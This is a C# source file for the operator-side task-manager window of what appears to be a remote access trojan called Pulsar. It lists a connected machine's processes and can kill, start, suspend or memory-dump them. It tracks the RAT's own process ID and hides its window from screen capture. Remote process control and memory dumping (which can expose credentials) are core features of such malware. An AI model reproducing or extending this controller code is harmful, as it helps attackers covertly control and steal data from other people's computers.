using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Models;
using Pulsar.Server.Controls;
using Pulsar.Server.Controls.Wpf;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Pulsar.Common.Messages;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskManager : Form
    {
        private readonly Client _connectClient;
        private readonly TaskManagerHandler _taskManagerHandler;
        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new();
        private List<FrmMemoryDump> _memoryDumps = new();
        private int? _ratPid = null;
        private readonly ProcessTreeView _processTreeView;
        private Common.Models.Process[] _currentProcesses = Array.Empty<Common.Models.Process>();
        private ProcessTreeSortColumn _sortColumn = ProcessTreeSortColumn.Name;
        private bool _sortAscending = true;

        private readonly Timer _countdownTimer;
        private int _countdownValue = 5;
        private bool _pauseAutoRefresh = false;
        private System.Drawing.Color _originalLabelColor;

        public static FrmTaskManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var form)) return form;
            form = new FrmTaskManager(client);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms[client] = form;
            return form;
        }

        public FrmTaskManager(Client client)
        {
            _connectClient = client;
            _taskManagerHandler = new TaskManagerHandler(client);
            _processTreeView = new ProcessTreeView();

            RegisterMessageHandler();
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            _processTreeView.SortRequested += ProcessTreeView_SortRequested;
            _processTreeView.SelectedProcessChanged += ProcessTreeView_SelectedProcessChanged;
            processTreeHost.Child = _processTreeView;

            // Save original label color
            _originalLabelColor = toolStripStatusLabel1.ForeColor;

            // Countdown timer for refresh
            _countdownTimer = new Timer { Interval = 1000 }; // ticks every second
            _countdownTimer.Tick += CountdownTimer_Tick;
            _countdownTimer.Start();
        }

        private void CountdownTimer_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel1.Text = $"Refreshing in {_countdownValue}s...";

            if (_countdownValue == 2)
                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Yellow;
            else if (_countdownValue == 1)
                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Red;
            else
                toolStripStatusLabel1.ForeColor = _originalLabelColor;

            // Only decrement if not at 0
            if (_countdownValue > 0)
                _countdownValue--;
            else
            {
                if (!_pauseAutoRefresh)
                    _taskManagerHandler.RefreshProcesses();

                // Keep the red visible for one tick (1 second)
                _countdownValue = 5;
                toolStripStatusLabel1.ForeColor = _originalLabelColor;
            }
        }


        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _taskManagerHandler.ProgressChanged += (s, processes) =>
            {
                TasksChanged(s, processes, _taskManagerHandler.LastProcessesResponse?.RatPid);
            };
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            _taskManagerHandler.OnResponseReceived += CreateMemoryDump;
            MessageHandler.Register(_taskManagerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_taskManagerHandler);
            _taskManagerHandler.OnResponseReceived -= CreateMemoryDump;
            _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            _taskManagerHandler.Dispose();
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected) this.Invoke((MethodInvoker)this.Close);
        }

        private void TasksChanged(object sender, Common.Models.Process[] processes, int? ratPid)
        {
            _ratPid = ratPid;
            _currentProcesses = processes ?? Array.Empty<Common.Models.Process>();
            RenderProcesses();
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            string text = action switch
            {
                ProcessAction.Start => result ? "Process started successfully" : "Failed to start process",
                ProcessAction.End => result ? "Process ended successfully" : "Failed to end process",
                _ => string.Empty
            };
            processesToolStripStatusLabel.Text = text;
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
            _taskManagerHandler.RefreshProcesses();
        }

        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            _countdownTimer.Stop();
            UnregisterMessageHandler();
        }

        private IEnumerable<Common.Models.Process> GetSelectedProcesses() =>
            _processTreeView?.SelectedProcesses ?? Array.Empty<Common.Models.Process>();

        private void RenderProcesses()
        {
            processTreeHost.Enabled = _taskManagerHandler != null;
            _processTreeView.UpdateProcesses(_currentProcesses, _sortColumn, _sortAscending, _ratPid);

            string sortLabel = _sortColumn switch
            {
                ProcessTreeSortColumn.Pid => "PID",
                ProcessTreeSortColumn.WindowTitle => "Title",
                _ => "Name"
            };
            string orderLabel = _sortAscending ? "asc" : "desc";
            processesToolStripStatusLabel.Text = $"Processes: {_currentProcesses.Length} | Sort: {sortLabel} ({orderLabel})";
        }

        private void ProcessTreeView_SortRequested(object sender, SortRequestedEventArgs e)
        {
            if (_sortColumn == e.Column) _sortAscending = !_sortAscending;
            else { _sortColumn = e.Column; _sortAscending = true; }
            RenderProcesses();
        }

        private void ProcessTreeView_SelectedProcessChanged(object sender, EventArgs e) { }

        private void CreateMemoryDump(object sender, DoProcessDumpResponse response)
        {
            if (response.Result)
            {
                this.Invoke((MethodInvoker)(() =>
                {
                    var dumpFrm = FrmMemoryDump.CreateNewOrGetExisting(_connectClient, response);
                    _memoryDumps.Add(dumpFrm);
                    dumpFrm.Show();
                }));
            }
            else
            {
                string reason = string.IsNullOrEmpty(response.FailureReason) ? "" : $"Reason: {response.FailureReason}";
                MessageBox.Show($"Failed to dump process!\n{reason}", $"Failed to dump process ({response.Pid}) - {response.ProcessName}");
            }
        }

        public void SetAutoRefreshEnabled(bool enabled) => _pauseAutoRefresh = !enabled;

        private void PerformOnSelectedProcesses(Action<Common.Models.Process> action)
        {
            _pauseAutoRefresh = true;
            try
            {
                var selected = GetSelectedProcesses().ToList();
                foreach (var process in selected)
                    action(process);
            }
            finally
            {
                _pauseAutoRefresh = false;
            }
        }

        #region Menu Actions

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.EndProcess(p.Id));

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processName = string.Empty;
            if (InputBox.Show("Process name", "Enter Process name:", ref processName) == DialogResult.OK)
                _taskManagerHandler.StartProcess(processName);
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e) =>
            _taskManagerHandler.RefreshProcesses();

        private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.DumpProcess(p.Id));

        private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SuspendProcess(p.Id));

        private void topmostOnToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, true));

        private void topmostOffToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, false));

        #endregion
    }
}
